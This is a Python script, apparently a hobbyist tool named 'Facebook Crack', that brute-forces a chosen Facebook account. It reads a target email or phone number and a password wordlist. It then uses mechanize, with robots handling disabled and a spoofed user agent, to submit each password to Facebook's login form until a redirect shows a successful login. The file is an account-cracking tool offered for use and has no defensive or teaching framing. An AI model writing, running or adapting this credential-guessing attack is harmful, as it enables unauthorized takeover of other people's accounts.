#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import sys
import mechanize
import http.cookiejar
import random




email = str(input("Enter the Facebook Username (or) Email (or) Phone Number : "))


passwordList = str(input("Enter the wordList name and path : "))


login = 'https://www.facebook.com/login.php?login_attempt=1'


userAgents = [('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36')]

def main():
	global br
	br = mechanize.Browser()
	cj = http.cookiejar.LWPCookieJar()
	br.set_handle_robots(False)
	br.set_handle_redirect(True)
	br.set_cookiejar(cj)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
	welcome()
	search()
	print("Password does not exist in the wordList")

	
	
def brute(password):
	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
	sys.stdout.flush()
	br.addheaders = [('User-agent', random.choice(userAgents))]
	site = br.open(login)
	br.select_form(nr = 0)
	br.form['email'] = email
	br.form['pass'] = password
	sub = br.submit()
	log = sub.geturl()
	if log != login and (not 'login_attempt' in log):
			print("\n\n[+] Password Find = {}".format(password))
			input("ANY KEY to Exit....")
			sys.exit(1)

			
def search():
	global password
	passwords = open(passwordList,"r")
	for password in passwords:
		password = password.replace("\n","")
		brute(password)

		
#welcome 
def welcome():
	wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author:AL-Alamy             | 
        |	       Version 1.0                |
        |   https://www.youtube.com/c/ALAlamyTube |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
"""
	total = open(passwordList,"r")
	total = total.readlines()
	print(wel)  
	print (" [*] Account to crack : {}".format(email))
	print (" [*] Loaded :" , len(total), "passwords")
	print (" [*] Cracking, please wait ...\n\n")

	
if __name__ == '__main__':
	main()
